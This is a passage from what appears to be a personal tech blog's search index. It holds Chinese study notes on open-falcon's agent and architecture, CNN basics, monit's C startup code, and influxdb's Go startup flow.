{\n\t\t\tbuf.Reset()\n\t\t\tbuf.WriteString(k)\n\t\t\tbuf.WriteString(\"=\")\n\t\t\tbuf.WriteString(v)\n\t\t\tdefault_tags_list = append(default_tags_list, buf.String())\n\t\t}\n\t\tdefault_tags := strings.Join(default_tags_list, \",\")\n\n\t\tfor i, x := range metrics {\n\t\t\tbuf.Reset()\n\t\t\tif x.Tags == \"\" {\n\t\t\t\tmetrics[i].Tags = default_tags\n\t\t\t} else {\n\t\t\t\tbuf.WriteString(metrics[i].Tags)\n\t\t\t\tbuf.WriteString(\",\")\n\t\t\t\tbuf.WriteString(default_tags)\n\t\t\t\tmetrics[i].Tags = buf.String()\n\t\t\t}\n\t\t}\n\t}\n\n\tdebug := Config().Debug\n\n\tif debug {\n\t\tlog.Printf(\"=> <Total=%d> %v\\n\", len(metrics), metrics[0])\n\t}\n\n\tvar resp model.TransferResponse\n    // 最重要的地方，发送数据\n\tSendMetrics(metrics, &resp)\n\n\tif debug {\n\t\tlog.Println(\"<=\", &resp)\n\t}\n}\n```\n\n```go\nfunc SendMetrics(metrics []*model.MetricValue, resp *model.TransferResponse) {\n\trand.Seed(time.Now().UnixNano())\n\tfor _, i := range rand.Perm(len(Config().Transfer.Addrs)) {\n\t\taddr := Config().Transfer.Addrs[i]\n\t\t// 获取transfer的客户端\n\t\tc := getTransferClient(addr)\n\t\tif c == nil {\n            //没有就初始化一个\n\t\t\tc = initTransferClient(addr)\n\t\t}\n\t\t//抓取数据\n\t\tif updateMetrics(c, metrics, resp) {\n\t\t\tbreak\n\t\t}\n\t}\n}\n```\n\n调用transfer模块的rpc接口update来更新数据：\n\n```go\n\nfunc updateMetrics(c *SingleConnRpcClient, metrics []*model.MetricValue, resp *model.TransferResponse) bool {\n\terr := c.Call(\"Transfer.Update\", metrics, resp)\n\tif err != nil {\n\t\tlog.Println(\"call Transfer.Update fail:\", c, err)\n\t\treturn false\n\t}\n\treturn true\n}\n```\n\n最后启动http服务，启动服务之前需要初始化init函数:\n\n```go\nfunc init() {\n\tconfigAdminRoutes()  // 初始化admin接口路由\n\tconfigCpuRoutes()    // 初始化cpu接口路由\n\tconfigDfRoutes()     // 初始化磁盘接口路由\n\tconfigHealthRoutes()   // 初始化健康度路由\n\tconfigIoStatRoutes()   //初始化io\n\tconfigKernelRoutes()   //初始化内核\n\tconfigMemoryRoutes()   //初始化memory\n\tconfigPageRoutes()    //初始化page\n\tconfigPluginRoutes()   //初始化插件\n\tconfigPushRoutes()     //初始化push, 可以使用push接口推送数据，通过这个接口转发到transfer\n\tconfigRunRoutes()      //初始化Run\n\tconfigSystemRoutes()    //初始化系统\n}\n```\n\n启动http服务Start函数：\n\n```go\nfunc Start() {\n\tif !g.Config().Http.Enabled {\n\t\treturn\n\t}\n\n\taddr := g.Config().Http.Listen\n\tif addr == \"\" {\n\t\treturn\n\t}\n\n\ts := &http.Server{\n\t\tAddr:           addr,\n\t\tMaxHeaderBytes: 1 << 30,\n\t}\n\n\tlog.Println(\"listening\", addr)\n\tlog.Fatalln(s.ListenAndServe())\n}\n```\n\n补充一点：这些接口都是开放的api，dashboard中请求的数据接口是自己实现从数据库中查询的。dashboard中接口时基于django编写了接口，然后用js来查询这些接口数据。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["monitor"],"categories":["monitor"]},{"title":"redis 源码思维导图","url":"/2020/01/20/redis源码分析思维导图/","content":"\n## redis 源码思维导图\n\n本人画的redis源码思维导图，有点乱，自己凑合着看看吧~~ orz..\n\n![redis-server](/images/redis-server.png)","tags":["redis"],"categories":["redis"]},{"title":"open-falcon 架构","url":"/2020/01/20/open-falcon框架学习/","content":"\n## open-falcon 架构\n\nopen-falcon 主要架构图：\n\n![open-falcon architecture](/images/func_intro_1.png)\n\n各个模块说明：\n\nagent 组件：\n\n目前 agent 服务已经覆盖公司大部分机器，一个自动采集机器指标的自动化服务。\n\n数据上报支持三种方式: \n\n1. agent 自采集基础监控上报；\n\n2. 用户自定义推送数据 (数据按照指定格式推送到本地 agent 端口)；\n\n3. 插件采集上报。\n\nhbs 组件：\n\n心跳服务器，定时从 DB 获取节点与主机对应关系、插件与节点绑定列表、模板、策略、全局策略等信息；将插件与节点绑定关系解析为插件与主机一一对应关系，并提供 rpc 接口方便所有 agent 查询；将 agent 上报的版本信息、插件信息写入 falcon 数据库；将模板、策略解析为策略与主机的关系对应表，与全局策略一起，以 rpc 方式提供给 judge 服务，方便其定时获取。\n\ntransfer 组件：\n\n启动时维护两个一致性哈希列表，分别对应 graph 服务与 judge 服务，用于通过 endpoint 和 counter 计算得到的 MD5，定位每条监控数据应该存储到哪个 graph 实例和 judge 实例；提供数据转发功能，将 agent 通过 rpc 上报的监控数据，通过一致性哈希定位后，上报给相应的 graph 实例和 judge 实例；使用 rpc 接口提供 history 监控数据查询功能，用于绘图展示等。\n\ngraph 组件：\n\n接入 rrdtool，用于监控数据持久化，通过 endpoint 和 counter 计算的 MD5 确定文件名；提供 rpc 接口，接收 transfer 上报的监控数据，并支持缓存，每个监控数据缓存半小时后再做数据持久化以减轻磁盘 IO 压力，提高整体吞吐量；提供索引缓存，每一个监控数据上报后，通过 endpoint、counter、step、timestamp 构建缓存，如果已存在则更新 timestamp，否则新建并上报至 graph 数据库；提供历史监控数据查询的 rpc 接口，便于 transfer 调用查询，查询时先通过索引缓存确认相应的 endpoint、counter 是否存在，如果存在则查询合并 rrd 文件中持久化数据与缓存数据并返回，否则直接返回。\n\njudge 组件：\n\n定时从 hbs 服务获取主机与策略的一一对应关系、以及全局策略，统称告警策略，用于告警判别；提供 rpc 接口，用于接收 transfer 上报的监控数据，收到每条数据时，遍历所有告警策略，如果符合告警条件，则将告警策略和监控数据存储到 redis 队列。\n\nalarm 组件：\n\n不停遍历 redis 队列，从中取出 judge 存储的告警策略和监控数据，写入报警数据库，然后依照告警策略中配置的告警组和获取告警成员的联系方式，和告警形成一一对应的关系，上报给 redis，方便 alarm 的下游服务进行告警发送。\n\naggregator 组件：\n\n集群监控的本质是一个聚合功能。单台机器的监控指标难以反应整个集群的情况，我们需要把整个集群的机器（体现为 xbox 某个节点下的机器）综合起来看。比如所有机器的 qps 加和才是整个集群的 qps，所有机器的 request_fail 数量 ÷ 所有机器的 request_total 数量 = 整个集群的请求失败率。我们计算出集群的某个整体指标之后，也会有 “查看该指标的历史趋势图” “为该指标配置报警” 这种需求，故而，我们会把这个指标重新 push 回监控 server 端，于是，你就可以把她当成一个普通 counter 来对待了。\n\nnodata 组件：\n\nnodata 能够和 judge 一起，监测采集项的上报异常，过程为: 配置了 nodata 的采集项超时未上报数据，nodata 生成一条非法的 mock 数据；用户在 judge 上配置相应的报警策略，收到 mock 数据就产生报警。采集项上报异常检测，作为 judge 的一个必要补充，能够使 judge 的实时报警功能更加完善、可靠。nodata 只为少数重要的采集项服务，其处理的采集项的数量，应该不多于 judge 的十分之一。滥用 nodata，将会给 falcon 的运维管理带来很多问题。通常 nodata 按照 step 从绘图中取不到打点数据时候，当然是有一定的容错 step，一般我们控制在 2 到 3 个 step。\n","tags":["monitor"],"categories":["monitor"]},{"title":"CNN学习笔记","url":"/2020/01/19/CNN学习/","content":"\n## CNN学习笔记\n\n**从神经网络到卷积神经网络（CNN）**\n\n![img](/images/1093303-20170430194200912-687300437.jpg)\n\n**卷积神经网络的层级结构**\n   • 数据输入层/ Input layer\n　• 卷积计算层/ CONV layer\n　• ReLU激励层 / ReLU layer\n　• 池化层 / Pooling layer\n　• 全连接层 / FC layer\n\n### **数据输入层**\n\n该层要做的处理主要是对原始图像数据进行预处理，其中包括：\n\n去均值：把输入数据各个维度都中心化为0，如下图所示，其目的就是把样本的中心拉回到坐标系原点上。\n\n 归一化：幅度归一化到同样的范围，如下所示，即减少各维度数据取值范围的差异而带来的干扰，比如，我们有两个维度的特征A和B，A范围是0到10，而B范围是0到10000，如果直接使用这两个特征是有问题的，好的做法就是归一化，即A和B的数据都变为0到1的范围。\n\nPCA/白化：用PCA降维；白化是对数据各个特征轴上的幅度归一化\n\n去均值与归一化效果图：\n\n![img](/images/1093303-20170430194338194-1949897491.jpg)\n\n去相关与白化效果图：\n\n![img](/images/1093303-20170430194357553-1200745791.jpg)\n\n### **卷积计算层**\n\n局部关联。每个神经元看做一个滤波器(filter)\n\n窗口(receptive field)滑动， filter对局部数据计算\n\n深度/depth\n\n步长/stride （窗口一次滑动的长度）\n\n填充值/zero-padding\n\n![img](/images/1093303-20170430194425147-845167791.png)\n\n![img](/images/1093303-20190120113539659-455066516.gif)\n\n**参数共享机制**\n\n在卷积层中每个神经元连接数据窗的权重是固定的，每个神经元只关注一个特性。神经元就是图像处理中的滤波器，比如边缘检测专用的Sobel滤波器，即卷积层的每个滤波器都会有自己所关注一个图像特征，比如垂直边缘，水平边缘，颜色，纹理等等，这些所有神经元加起来就好比就是整张图像的特征提取器集合。\n\n一组固定的权重和不同窗口内数据做内积: 卷积\n\n### **激励层**\n\n把卷积层输出结果做非线性映射。\n\n![img](/images/1093303-20170430194934006-705271151.jpg)\n\nCNN采用的激励函数一般为ReLU(The Rectified Linear Unit/修正线性单元)                 \n\n激励层的实践经验：\n不要用sigmoid！不要用sigmoid！不要用sigmoid！\n首先试RELU，因为快，但要小心点\n如果2失效，请用Leaky ReLU或者Maxout\n某些情况下tanh倒是有不错的结果，但是很少\n\n### **池化层**\n\n池化层夹在连续的卷积层中间， 用于压缩数据和参数的量，减小过拟合。\n简而言之，如果输入是图像的话，那么池化层的最主要作用就是压缩图像。\n\n1. 特征不变性，也就是我们在图像处理中经常提到的特征的尺度不变性，池化操作就是图像的resize，平时一张狗的图像被缩小了一倍我们还能认出这是一张狗的照片，这说明这张图像中仍保留着狗最重要的特征，我们一看就能判断图像中画的是一只狗，图像压缩时去掉的信息只是一些无关紧要的信息，而留下的信息则是具有尺度不变性的特征，是最能表达图像的特征。\n2. 特征降维，我们知道一幅图像含有的信息是很大的，特征也很多，但是有些信息对于我们做图像任务时没有太多用途或者有重复，我们可以把这类冗余信息去除，把最重要的特征抽取出来，这也是池化操作的一大作用。\n3. 在一定程度上防止过拟合，更方便优化。\n\n![img](/images/1093303-20170430195028600-318072954.jpg)\n\n\n\n池化层用的方法有Max pooling 和 average pooling，而实际用的较多的是Max pooling。\n\nMax pooling：\n\n对于每个2*2的窗口选出最大的数作为输出矩阵的相应元素的值，比如输入矩阵第一个2*2窗口中最大的数是6，那么输出矩阵的第一个元素就是6，如此类推。\n\n### **全连接层**\n\n![img](/images/1093303-20170430195130772-454262568.jpg)\n\n**一般CNN结构依次为**\n　　1. INPUT\n　　2. [[CONV -> RELU]*N -> POOL?]*M \n　　3. [FC -> RELU]*K\n　　4. FC\n\n**卷积神经网络之优缺点**：\n\n优点：\n共享卷积核，对高维数据处理无压力\n无需手动选取特征，训练好权重，即得特征分类效果好\n缺点：\n需要调参，需要大样本量，训练最好要GPU\n物理含义不明确\n\n**总结**\n卷积网络在本质上是一种输入到输出的映射，它能够学习大量的输入与输出之间的映射关系，而不需要任何输入和输出之间的精确的数学表达式，只要用已知的模式对卷积网络加以训练，网络就具有输入输出对之间的映射能力。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["深度学习"],"categories":["深度学习"]},{"title":"monit代码分析","url":"/2020/01/17/monit学习/","content":"\n## monit代码分析\n\n主要流程main函数:\n\n```c\n/**\n * The Prime mover\n */\nint main(int argc, char **argv) {\n        Bootstrap(); // Bootstrap libmonit  //初始化代码\n        Bootstrap_setAbortHandler(vLogAbortHandler);  // Abort Monit on exceptions thrown by libmonit\n        Bootstrap_setErrorHandler(vLogError);\n        setlocale(LC_ALL, \"C\");\n        prog = File_basename(argv[0]);\n#ifdef HAVE_OPENSSL\n        Ssl_start();\n#endif\n        init_env();\n        handle_options(argc, argv);\n        do_init();\n        do_action(argc, argv);\n        do_exit(false);\n        return 0;\n}\n```\n\nBootstrap函数：\n\n ```c\nBootstrap:\nvoid Bootstrap(void) {\n        Exception_init();\n        Thread_init();\n}\n\n ```\n\nSsl_start函数，加载ssl协议\n\n```c\nvoid Ssl_start() {\n#if (OPENSSL_VERSION_NUMBER < 0x10100000L) || defined(LIBRESSL_VERSION_NUMBER)\n        SSL_library_init();\n        SSL_load_error_strings();\n        int locks = CRYPTO_num_locks();\n        instanceMutexTable = CALLOC(locks, sizeof(Mutex_T));\n        for (int i = 0; i < locks; i++)\n                Mutex_init(instanceMutexTable[i]);\n        CRYPTO_THREADID_set_callback(_threadID);\n        CRYPTO_set_locking_callback(_mutexLock);\n#endif\n        if (File_exist(URANDOM_DEVICE))\n                RAND_load_file(URANDOM_DEVICE, RANDOM_BYTES);\n        else if (File_exist(RANDOM_DEVICE))\n                RAND_load_file(RANDOM_DEVICE, RANDOM_BYTES);\n        else\n                THROW(AssertException, \"SSL: cannot find %s nor %s on the system\", URANDOM_DEVICE, RANDOM_DEVICE);\n}\n```\n\n初始化环境：\n\n```c\n/**\n * Initialize the program environment\n *\n * @see https://bitbucket.org/tildeslash/monit/commits/cd545838378517f84bdb0989cadf461a19d8ba11\n */\nvoid init_env() {\n        Util_closeFds();\n        // Ensure that std descriptors (0, 1 and 2) are open\n        int devnull = open(\"/dev/null\", O_RDWR);\n        if (devnull == -1) {\n                THROW(AssertException, \"Cannot open /dev/null -- %s\", STRERROR);\n        }\n        for (int i = 0; i < 3; i++) {\n                struct stat st;\n                if (fstat(i, &st) == -1) {\n                        if (dup2(devnull, i) < 0) {\n                                close(devnull);\n                                THROW(AssertException, \"dup2 failed -- %s\", STRERROR);\n                        }\n                }\n        }\n        close(devnull);\n        // Get password struct with user info\n        char buf[4096];\n        struct passwd pw, *result = NULL;\n        if (getpwuid_r(geteuid(), &pw, buf, sizeof(buf), &result) != 0 || ! result)\n                THROW(AssertException, \"getpwuid_r failed -- %s\", STRERROR);\n        Run.Env.home = Str_dup(pw.pw_dir);\n        Run.Env.user = Str_dup(pw.pw_name);\n        // Get CWD\n        char t[PATH_MAX];\n        if (! Dir_cwd(t, PATH_MAX))\n                THROW(AssertException, \"Monit: Cannot read current directory -- %s\", STRERROR);\n        Run.Env.cwd = Str_dup(t);\n}\n\n```\n\nhandle_options函数处理传参情况：\n\ndo_init函数初始化文件和服务\n\n```c\n/**\n * Initialize this application - Register signal handlers,\n * Parse the control file and initialize the program's\n * datastructures and the log system.\n */\nstatic void do_init() {\n        /*\n         * Register interest for the SIGTERM signal,\n         * in case we run in daemon mode this signal\n         * will terminate a running daemon.\n         */\n        signal(SIGTERM, do_destroy);\n\n        /*\n         * Register interest for the SIGUSER1 signal,\n         * in case we run in daemon mode this signal\n         * will wakeup a sleeping daemon.\n         */\n        signal(SIGUSR1, do_wakeup);\n\n        /*\n         * Register interest for the SIGINT signal,\n         * in case we run as a server but not as a daemon\n         * we need to catch this signal if the user pressed\n         * CTRL^C in the terminal\n         */\n        signal(SIGINT, do_destroy);\n\n        /*\n         * Register interest for the SIGHUP signal,\n         * in case we run in daemon mode this signal\n         * will reload the configuration.\n         */\n        signal(SIGHUP, do_reload);\n\n        /*\n         * Register no interest for the SIGPIPE signal,\n         */\n        signal(SIGPIPE, SIG_IGN);\n\n        /*\n         * Initialize the random number generator\n         */\n        srandom((unsigned)(Time_now() + getpid()));\n\n        /*\n         * Initialize the Runtime mutex. This mutex\n         * is used to synchronize handling of global\n         * service data\n         */\n        Mutex_init(Run.mutex);\n\n        /*\n         * Initialize heartbeat mutex and condition\n         */\n        Mutex_init(heartbeatMutex);\n        Sem_init(heartbeatCond);\n\n        /*\n         * Get the position of the control file\n         */\n        if (! Run.files.control)\n                Run.files.control = file_findControlFile();\n\n        /*\n         * Initialize the system information data collecting interface\n         */\n        if (init_system_info())\n                Run.flags |= Run_ProcessEngineEnabled;\n\n        /*\n         * Start the Parser and create the service list. This will also set\n         * any Runtime constants defined in the controlfile.\n         */\n        if (! parse(Run.files.control))\n                exit(1);\n\n        /*\n         * Initialize the log system\n         */\n        if (! log_init())\n                exit(1);\n\n        /*\n         * Did we find any service ?\n         */\n        if (! servicelist) {\n                LogError(\"No service has been specified\\n\");\n                exit(0);\n        }\n\n        /*\n         * Initialize Runtime file variables\n         */\n        file_init();\n\n        /*\n         * Should we print debug information ?\n         */\n        if (Run.debug) {\n                Util_printRunList();\n                Util_printServiceList();\n        }\n\n        /*\n         * Reap any stray child processes we may have created\n         */\n        atexit(waitforchildren);\n}\n```\n\nfile_findControlFile()函数，读取配置文件，corefoundation\n\n```c\nchar *file_findControlFile() {\n        char *rcfile = CALLOC(sizeof(char), STRLEN + 1);\n        snprintf(rcfile, STRLEN, \"%s/.%s\", Run.Env.home, MONITRC);\n        if (File_exist(rcfile)) {\n                return rcfile;\n        }\n        snprintf(rcfile, STRLEN, \"/etc/%s\", MONITRC);\n        if (File_exist(rcfile)) {\n                return rcfile;\n        }\n        snprintf(rcfile, STRLEN, \"%s/%s\", SYSCONFDIR, MONITRC);\n        if (File_exist(rcfile)) {\n                return rcfile;\n        }\n        snprintf(rcfile, STRLEN, \"/usr/local/etc/%s\", MONITRC);\n        if (File_exist(rcfile)) {\n                return rcfile;\n        }\n        if (File_exist(MONITRC)) {\n                snprintf(rcfile, STRLEN, \"%s/%s\", Run.Env.cwd, MONITRC);\n                return rcfile;\n        }\n        LogError(\"Cannot find the Monit control file at ~/.%s, /etc/%s, %s/%s, /usr/local/etc/%s or at ./%s \\n\", MONITRC, MONITRC, SYSCONFDIR, MONITRC, MONITRC, MONITRC);\n        exit(1);\n}\n```\n\ndo_action主流程:\n\n```c\n/**\n * Dispatch to the submitted action - actions are program arguments\n */\nstatic void do_action(int argc, char **args) {\n        char *action = args[optind];\n\n        Run.flags |= Run_Once;\n\n        if (! action) {\n                do_default();\n        } else if (IS(action, \"start\")     ||\n                   IS(action, \"stop\")      ||\n                   IS(action, \"monitor\")   ||\n                   IS(action, \"unmonitor\") ||\n                   IS(action, \"restart\")) {\n                char *service = args[++optind];\n                if (Run.mygroup || service) {\n                        int errors = 0;\n                        List_T services = List_new();\n                        if (Run.mygroup) {\n                                for (ServiceGroup_T sg = servicegrouplist; sg; sg = sg->next) {\n                                        if (IS(Run.mygroup, sg->name)) {\n                                                for (list_t m = sg->members->head; m; m = m->next) {\n                                                        Service_T s = m->e;\n                                                        List_append(services, s->name);\n                                                }\n                                                break;\n                                        }\n                                }\n                                if (List_length(services) == 0) {\n                                        List_free(&services);\n                                        LogError(\"Group '%s' not found\\n\", Run.mygroup);\n                                        exit(1);\n                                }\n                        } else if (IS(service, \"all\")) {\n                                for (Service_T s = servicelist; s; s = s->next)\n                                        List_append(services, s->name);\n                        } else {\n                                List_append(services, service);\n                        }\n                        errors = exist_daemon() ? (HttpClient_action(action, services) ? 0 : 1) : control_service_string(services, action);\n                        List_free(&services);\n                        if (errors)\n                                exit(1);\n                } else {\n                        LogError(\"Please specify a service name or 'all' after %s\\n\", action);\n                        exit(1);\n                }\n        } else if (IS(action, \"reload\")) {\n                LogInfo(\"Reinitializing %s daemon\\n\", prog);\n                kill_daemon(SIGHUP);\n        } else if (IS(action, \"status\")) {\n                char *service = args[++optind];\n                if (! HttpClient_status(Run.mygroup, service))\n                        exit(1);\n        } else if (IS(action, \"summary\")) {\n                char *service = args[++optind];\n                if (! HttpClient_summary(Run.mygroup, service))\n                        exit(1);\n        } else if (IS(action, \"report\")) {\n                char *type = args[++optind];\n                if (! HttpClient_report(type))\n                        exit(1);\n        } else if (IS(action, \"procmatch\")) {\n                char *pattern = args[++optind];\n                if (! pattern) {\n                        printf(\"Invalid syntax - usage: procmatch \\\"<pattern>\\\"\\n\");\n                        exit(1);\n                }\n                ProcessTree_testMatch(pattern);\n        } else if (IS(action, \"quit\")) {\n                kill_daemon(SIGTERM);\n        } else if (IS(action, \"validate\")) {\n                if (do_wakeupcall()) {\n                        char *service = args[++optind];\n                        HttpClient_status(Run.mygroup, service);\n                } else {\n                        _validateOnce();\n                }\n                exit(1);\n        } else {\n                LogError(\"Invalid argument -- %s  (-h will show valid arguments)\\n\", action);\n                exit(1);\n        }\n}\n```\n\naction= start stop monitor unmonitor restart 通过维护一个服务列表发送post请求给服务端来启动服务。\n\ndo_default主要启动服务的函数\n\n```c\n/**\n * Default action - become a daemon if defined in the Run object and\n * run validate() between sleeps. If not, just run validate() once.\n * Also, if specified, start the monit http server if in deamon mode.\n */\nstatic void do_default() {\n        if (Run.flags & Run_Daemon) {\n                if (do_wakeupcall())\n                        exit(0);\n\n                Run.flags &= ~Run_Once;\n                if (can_http()) {\n                        if (Run.httpd.flags & Httpd_Net)\n                                LogInfo(\"Starting Monit %s daemon with http interface at [%s]:%d\\n\", VERSION, Run.httpd.socket.net.address ? Run.httpd.socket.net.address : \"*\", Run.httpd.socket.net.port);\n                        else if (Run.httpd.flags & Httpd_Unix)\n                                LogInfo(\"Starting Monit %s daemon with http interface at %s\\n\", VERSION, Run.httpd.socket.unix.path);\n                } else {\n                        LogInfo(\"Starting Monit %s daemon\\n\", VERSION);\n                }\n\n                if (! (Run.flags & Run_Foreground))\n                        daemonize();\n\n                if (! file_createPidFile(Run.files.pid)) {\n                        LogError(\"Monit daemon died\\n\");\n                        exit(1);\n                }\n\n                if (! State_open())\n                        exit(1);\n                State_restore();\n\n                atexit(file_finalize);\n\n                if (Run.startdelay && State_reboot()) {\n                        time_t now = Time_now();\n                        time_t delay = now + Run.startdelay;\n\n                        LogInfo(\"Monit will delay for %ds on first start after reboot ...\\n\", Run.startdelay);\n\n                        /* sleep can be interrupted by signal => make sure we paused long enough */\n                        while (now < delay) {\n                                sleep((unsigned int)(delay - now));\n                                if (Run.flags & Run_Stopped)\n                                        do_exit(false);\n                                now = Time_now();\n                        }\n                }\n\n                if (can_http())\n                        monit_http(Httpd_Start);\n\n                /* send the monit startup notification */\n                Event_post(Run.system, Event_Instance, State_Changed, Run.system->action_MONIT_START, \"Monit %s started\", VERSION);\n\n                if (Run.mmonits) {\n                        Thread_create(heartbeatThread, heartbeat, NULL);\n                        heartbeatRunning = true;\n                }\n\n                while (true) {\n                        validate();\n\n                        /* In the case that there is no pending action then sleep */\n                        if (! (Run.flags & Run_ActionPending) && ! interrupt())\n                                sleep(Run.polltime);\n\n                        if (Run.flags & Run_DoWakeup) {\n                                Run.flags &= ~Run_DoWakeup;\n                                LogInfo(\"Awakened by User defined signal 1\\n\");\n                        }\n\n                        if (Run.flags & Run_Stopped) {\n                                do_exit(true);\n                        } else if (Run.flags & Run_DoReload) {\n                                do_reinit();\n                        } else {\n                                State_saveIfDirty();\n                        }\n                }\n        } else {\n                _validateOnce();\n        }\n}\n```\n\ndo_wakeupcall调用函数是否需要唤醒进程。\n\ncan_http()判断是否可以启动http.\n\ndaemonize()函数：\n\n```c\n/**\n * Transform a program into a daemon. Inspired by code from Stephen\n * A. Rago's book, Unix System V Network Programming.\n */\nvoid daemonize() {\n        pid_t pid;\n        /*\n         * Become a session leader to lose our controlling terminal\n         */\n        if ((pid = fork ()) < 0) {\n                LogError(\"Cannot fork a new process\\n\");\n                exit (1);\n        } else if (pid != 0) {\n                _exit(0);\n        }\n        setsid();\n        if ((pid = fork ()) < 0) {\n                LogError(\"Cannot fork a new process\\n\");\n                exit (1);\n        } else if (pid != 0) {\n                _exit(0);\n        }\n        /*\n         * Change current directory to the root so that other file systems can be unmounted while we're running\n         */\n        if (chdir(\"/\") < 0) {\n                LogError(\"Cannot chdir to / -- %s\\n\", STRERROR);\n                exit(1);\n        }\n        /*\n         * Attach standard descriptors to /dev/null. Other descriptors should be closed in env.c\n         */\n        Util_redirectStdFds();\n}\n```\n\nfile_createPidFile场景pid文件。\n\n服务数据结构，所有的服务数据结构都在monit.h文件中\n\nyacc flex解析\n\n使用flex词法解析器，yacc语法解析器。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["monitor"],"categories":["monitor"]},{"title":"influxdb","url":"/2020/01/17/influxdb1/","content":"\n### influxdb 启动流程学习笔记\n\n#### 流程分析\n\n本文基于influxdb 1.4来进行分析代码\n\ninfluxdb入口文件在 /cmd/influxd/main.go文件中\n\n```go\n// 主函数\nfunc main() {\n\trand.Seed(time.Now().UnixNano())\n\t//初始化\n\tm := NewMain()\n    // Run \n\tif err := m.Run(os.Args[1:]...); err != nil {\n\t\tfmt.Fprintln(os.Stderr, err)\n\t\tos.Exit(1)\n\t}\n}\n```\n\nNewMain函数初始化一个实例\n\n```go\n// NewMain return a new instance of Main.\nfunc NewMain() *Main {\n\treturn &Main{\n\t\tStdin:  os.Stdin,\n\t\tStdout: os.Stdout,\n\t\tStderr: os.Stderr,\n\t}\n}\n```\n\n主要流程在Run函数中，\n\n```go\n// Run determines and runs the command specified by the CLI args.\nfunc (m *Main) Run(args ...string) error {\n\tname, args := cmd.ParseCommandName(args)\n\n\t// Extract name from args.\n\tswitch name {\n\tcase \"\", \"run\":\n        // 默认执行流程\n\t\tcmd := run.NewCommand()\n\n\t\t// Tell the server the build details.\n\t\tcmd.Version = version\n\t\tcmd.Commit = commit\n\t\tcmd.Branch = branch\n\n        // 执行主要的函数\n\t\tif err := cmd.Run(args...); err != nil {\n\t\t\treturn fmt.Errorf(\"run: %s\", err)\n\t\t}\n\t\t//中断信号量\n\t\tsignalCh := make(chan os.Signal, 1)\n\t\tsignal.Notify(signalCh, os.Interrupt, syscall.SIGTERM)\n\t\tcmd.Logger.Info(\"Listening for signals\")\n\n\t\t// Block until one of the signals above is received\n\t\t<-signalCh\n\t\tcmd.Logger.Info(\"Signal received, initializing clean shutdown...\")\n\t\tgo cmd.Close()\n\n\t\t// Block again until another signal is received, a shutdown timeout elapses,\n\t\t// or the Command is gracefully closed\n\t\tcmd.Logger.Info(\"Waiting for clean shutdown...\")\n\t\tselect {\n\t\tcase <-signalCh:\n\t\t\tcmd.Logger.Info(\"Second signal received, initializing hard shutdown\")\n\t\tcase <-time.After(time.Second * 30):\n\t\t\tcmd.Logger.Info(\"Time limit reached, initializing hard shutdown\")\n\t\tcase <-cmd.Closed:\n\t\t\tcmd.Logger.Info(\"Server shutdown completed\")\n\t\t}\n\n\t\t// goodbye.\n\n\tcase \"backup\":\n        //备份\n\t\tname := backup.NewCommand()\n\t\tif err := name.Run(args...); err != nil {\n\t\t\treturn fmt.Errorf(\"backup: %s\", err)\n\t\t}\n\tcase \"restore\":\n        //恢复\n\t\tname := restore.NewCommand()\n\t\tif err := name.Run(args...); err != nil {\n\t\t\treturn fmt.Errorf(\"restore: %s\", err)\n\t\t}\n\tcase \"config\":\n        //打印当前配置\n\t\tif err := run.NewPrintConfigCommand().Run(args...); err != nil {\n\t\t\treturn fmt.Errorf(\"config: %s\", err)\n\t\t}\n\tcase \"version\":\n\t\tif err := NewVersionCommand().Run(args...); err != nil {\n\t\t\treturn fmt.Errorf(\"version: %s\", err)\n\t\t}\n\tcase \"help\":\n\t\tif err := help.NewCommand().Run(args...); err != nil {\n\t\t\treturn fmt.Errorf(\"help: %s\", err)\n\t\t}\n\tdefault:\n\t\treturn fmt.Errorf(`unknown command \"%s\"`+\"\\n\"+`Run 'influxd help' for usage`+\"\\n\\n\", name)\n\t}\n\n\treturn nil\n}\n```\n\n先分析run部分：\n\n```go\n// Run parses the config from args and runs the server.\nfunc (cmd *Command) Run(args ...string) error {\n\t// Parse the command line flags.\n\toptions, err := cmd.ParseFlags(args...)\n\tif err != nil {\n\t\treturn err\n\t}\n\n    //解析配置文件\n\tconfig, err := cmd.ParseConfig(options.GetConfigPath())\n\tif err != nil {\n\t\treturn fmt.Errorf(\"parse config: %s\", err)\n\t}\n\n\t// Apply any environment variables on top of the parsed config\n\tif err := config.ApplyEnvOverrides(cmd.Getenv); err != nil {\n\t\treturn fmt.Errorf(\"apply env config: %v\", err)\n\t}\n\n\t// Propogate the top-level join options down to the meta config\n    //解析join的集群环境下的iplist\n\tif config.Join != \"\" {\n\t\tconfig.Meta.JoinPeers = strings.Split(config.Join, \",\")\n\t}\n\n\t// Command-line flags for -join and -hostname override the config\n\t// and env variable\n\tif options.Join != \"\" {\n\t\tconfig.Meta.JoinPeers = strings.Split(options.Join, \",\")\n\t}\n\n    // 解析本地hostname\n\tif options.Hostname != \"\" {\n\t\tconfig.Hostname = options.Hostname\n\t}\n\n\t// Propogate the top-level hostname down to dependendent configs\n\tconfig.Meta.RemoteHostname = config.Hostname\n\n\t// Validate the configuration.\n    // 检查各个配置是否为空\n\tif err := config.Validate(); err != nil {\n\t\treturn fmt.Errorf(\"%s. To generate a valid configuration file run `influxd config > influxdb.generated.conf`\", err)\n\t}\n\n\tvar logErr error\n\tif cmd.Logger, logErr = config.Logging.New(cmd.Stderr); logErr != nil {\n\t\t// assign the default logger\n\t\tcmd.Logger = logger.New(cmd.Stderr)\n\t}\n\n\t// Attempt to run pprof on :6060 before startup if debug pprof enabled.\n    //是否开启pprof\n\tif config.HTTPD.DebugPprofEnabled {\n\t\truntime.SetBlockProfileRate(int(1 * time.Second))\n\t\truntime.SetMutexProfileFraction(1)\n\t\tgo func() { http.ListenAndServe(\"localhost:6060\", nil) }()\n\t}\n\n\t// Print sweet InfluxDB logo.\n    // 打印logo\n\tif !config.Logging.SuppressLogo && logger.IsTerminal(cmd.Stdout) {\n\t\tfmt.Fprint(cmd.Stdout, logo)\n\t}\n\n\t// Mark start-up in log.\n\tcmd.Logger.Info(\"InfluxDB starting\",\n\t\tzap.String(\"version\", cmd.Version),\n\t\tzap.String(\"branch\", cmd.Branch),\n\t\tzap.String(\"commit\", cmd.Commit))\n\tcmd.Logger.Info(\"Go runtime\",\n\t\tzap.String(\"version\", runtime.Version()),\n\t\tzap.Int(\"maxprocs\", runtime.GOMAXPROCS(0)))\n\n\t// 